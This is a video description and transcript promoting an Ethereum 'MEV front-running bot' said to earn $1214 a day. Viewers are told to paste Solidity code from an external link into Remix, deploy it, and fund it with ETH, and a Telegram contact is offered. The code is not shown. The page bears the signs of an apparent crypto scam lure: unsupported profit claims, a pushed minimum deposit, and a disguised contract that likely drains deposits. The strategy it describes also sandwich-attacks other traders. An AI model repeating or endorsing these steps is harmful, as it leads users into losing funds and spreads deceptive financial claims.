title: Make $1214 a DAY with a MEV Uniswap Ethereum Bot | Easy to follow Tutorial | 2023
description: Everyone in cryptocurrency needs to know about this.   Basically, Maximal Extractable Value (MEV) bots are arbitrage tools that sniffs Mempools for pending transactions on decentralized exchanges AKA DEXs for short (such as Uniswap, PancakeSwap, 1inch, Sushiswap, etc).   The bot works in a way which inserts your own transactions with a slightly higher gas fee, higher than the transaction which is trying to be entered. Essentially sandwiching the pending transaction and forcing yours to be automatically processed first which then profits off of the slippage differences between your transactions and the pending transactions.  You can message me on Telegram if you have any questions: https://t.me/SolidityMev  STEP BY STEP INSTRUCTIONS:  :backhand index pointing right: Download MetaMask: https://metamask.io/download  :backhand index pointing right: Access the Remix: https://remixide.org  :backhand index pointing right: Right click on the ''contracts'' folder and create a new file. Rename it as you like, for example ''bot.sol''  :backhand index pointing right: Paste THIS code in Remix: https://telegra.ph/SlippageBot-06-21  :backhand index pointing right: Move to the ''Solidity Compiler'' tab, select version ''0.6.6'' and then click ''Compile''  :backhand index pointing right: Move to the ''Deploy'' tab, select ''Injected Provider'' as the environment, then click ''Deploy''. After the transaction is confirmed, your bot has been created  :backhand index pointing right: Deposit funds (at least 0.1+ Ethereum to prevent negative slippage) to your exact contract/bot address  :backhand index pointing right: After your transaction is confirmed start the bot by clicking the ''start'' button and withdraw at anytime by clicking the ''withdraw'' button  Share your profits in the comments section below, like and subscribe for more lucrative ways to earn through cryptocurrency.  :police car light: EDIT: I've received messages from people who didn't fund the contract with enough Ethereum to cover gas fees and possible burn fees. The bot targets token contracts with max 10% burn fee and anything lower. Nowadays most tokens come with 2~6% fees. If you fund the contract with 0.2 ETH or less and the bot targets another token with high burn fees the contract will waste a lot of gas fees. I recommend funding the contract with at least 0.2 ETH to make sure that won't happen.  Can I turn off my computer? Yes. Once the smart contract has been deployed it lives on the blockchain. Just save the address and then you can import it into remix just below the ''Deploy'' button by pasting in the contract address and pressing ''At Address''.   Learn more about MEV here: www.ethereum.org/en/developers/docs/mev/  MEV Profit Live-Stream: https://eigenphi.io/  #ethereum #trading #defi #uniswap #pancakeswap #dex #eth   passive income, ethereum, eth, ethereum trading bot, slippage bot, slippage, mevbot, mev, crypto, cryptocurrency, defi, dex, uniswap, pancakeswap, sushiswap, defi trading bot, passive income with crypto, ethereum upgrade, ethereum 2.0, arbitrage bot, how to make money online 2023, how to make money on uniswap, how to make money online, sundaeswap, ethereum trader, day trading, stake ethereum, staking rewards, high apy, defi pool, crypto passive income, uniswap v3, liquidity, crypto passive income strategies, ethereum price, bitcoin price, ethereum support and resistance, ethereum price prediction, crypto arbitrage, yield farming, crypto trading, crypto wallets, cryptocurrency investment, crypto wallet, altcoins, coinbase, decentralized finance, DEX, how to earn 1000 day, 1000 per day, binance, gas fees, uniswap bot, crypto trading for beginners, bitcoin price prediction, front-running bot, front-run bot, frontrunning bot, vitalik buterin, vitalik, forex, forex trading, currency trading

asr.full_text: Hey guys it's George here. In this tutorial I'm going to explain an easy method to make passive income using decentralized exchanges like Uniswap. It's easy to set up, it requires no prior knowledge, anyone can do it. So without wasting more time let's hop to my computer and get started. Just make sure to check the description for the updates and hit that like button. Ok, let's say that Alice wants to exchange $1000 worth of ethers for a Uni token, and let's suppose that the Uni price is $5 at the moment of the transaction. So if we do a simple calculation, Allice will receive 200 units of the Uni token, but as the price of a token may increase, Uniswap requires users to set slippage. Which means the percentage of an eventual price increase that you accept for the transaction to go through. Now, in this example, if Alice set slippage to 10% which means that she agrees to pay up to 5.5 per Unit Token that's about 181 tokens for $1,000. So when Alice submits the transaction using MetaMask the scenario will be like this. Our bot will spot alice's transaction and buy unitoken at the price of $5.00, and increase the price so Alice will buy higher. Alice will buy 181 units of unitokein at a price of 5.5. So our bot will sell all the tokens bought on the first transaction, and then keep the profit which is, in the example, about $91, minus gas fees. All of that in the same block. So to start off, you'll need to have MetaMask installed and connected to the Ethereum mainnet. If you don't have MetaMask installed, you can find a link in the description on how to install it. What's a remix? Remix is a web application that allows us to develop, deploy, deploy compile and launch smart contracts coded in the solidity language. Now you'll find the link to the Remix website in the description below. Now head over to the left sidebar and create a new file named bot.sol Now if you look at the description, I've included a link to this code. You need to copy and paste that code This is our front runner bot contract that we're going to deploy. A couple of things to look at after pasting the code are line 55 and 56. If you check the addresses on Etherscan you'll see that these are the addresses of wrapped Ether tokens. Okay so you can see it's the official wrapped ether address. It's always a good idea to check that now back to remix. Now that our bot file is ready, let's compile it on the side menu click solidity compiler. Now, as you can see the contract is built for the 0.6 Point 6 version of solidity under compiler. Select the version 0.6 0.6 so it will match our contract now click on compil3 bot.sole and wait for the bot to compile so now we deploy this to our wallet head on over to deploy and run transactions on remix under the environment select injected web 3 to connect remix to our meta mask finally make sure you in aapbot pot.sol is selected under contract Now the deployment utility is ready Click the deploy button to publish our contract to the Ethereum blockchain We need to confirm the creation of our contract by paying some gas fees I always set gas fees to high, so it will speed up the transactions It's not a lot of difference but click confirm and wait for the transaction to be mined transaction confirmed now our contract is deployed so as you can see here there are four actions for a contract the start button will start the bot sniffing the mempool withdrawal will stop the bot anding the mempool. Withdrawal will stop the bot and transfer funds back to your wallet. Owner which returns the owner of the contract and stop will stop the bot from sniffing the mempool. So let's copy the contract address and make sure it was created. Head back to Etherscan and paste it. Okay so the next step is to fund our contract with some Ethers to be able to snipe liquidity pools. I'm going to copy this address and head back over to my metamask and make sure you've copied the right address. You can fund the contract with whatever amount you want, but obviously the more you put in, the larger the transaction, you'll be able to front run and the more profit you'll be able to accumulate more of it than we could. It's worth it. The way that we see it, is that you will be able to front run in the market, the more money you put in, the larger the transaction, you'll be able to front run and the more profit you'll be able to accumulate over time. So for instance, say you're only front running with 0.5 ethers. You won't be able to create as much slippage in the price as if you were inserting something like 10 etherscan.io. As you can see, our contract has 1 Ethereum on its balance, which is basically the amount we funded it with. The last step is to click Start. It will enable the bot to start sniffing the mempool to find different liquidity pairs in order for you to frontrun the transactions. I will see you guys in a couple hours. Well guys I want to share the profit the bot made. I have something around 1.37 ETH so basically it took me around a day to gain my deposit by more than 1 third, something close to 40 percent, which isn t that bad. So the bot will see on the other side that I made one more change, and that changes into 3, that are 10 hours, now you can see the total that I made by making the 10 hours for Ethereum it turns out to be 1.37 ETH, so you see the So basically it took me a day to gain my deposit by more than a third, something close to 40%, which isn't that bad. So the bot will continue to run until you press this withdrawal button. The bot will then exit the liquidity pool and will return back to your wallet, the ethers you entered initially plus the profit. So let's click it… This will charge us a little bit of gas, i'll set it to high again and then click confirm. There we go, the transaction is confirmed, so let's go to our metamask to check and see what I've now got. As you can see the balance from the bot is now in my wallet, I've had some weeks where I've made 5-6 Ethers. Sometimes it's not always profitable, and profits fluctuate week-to-week, but usually I make 2 plus Ethereum a week. If you have any questions, you can contact me on Telegram. I'll put the link to my Telegram below. So guys, share your profits in the comments below, hit the like button if you found this video valuable, and don't forget to subscribe so that you can stay Updated.
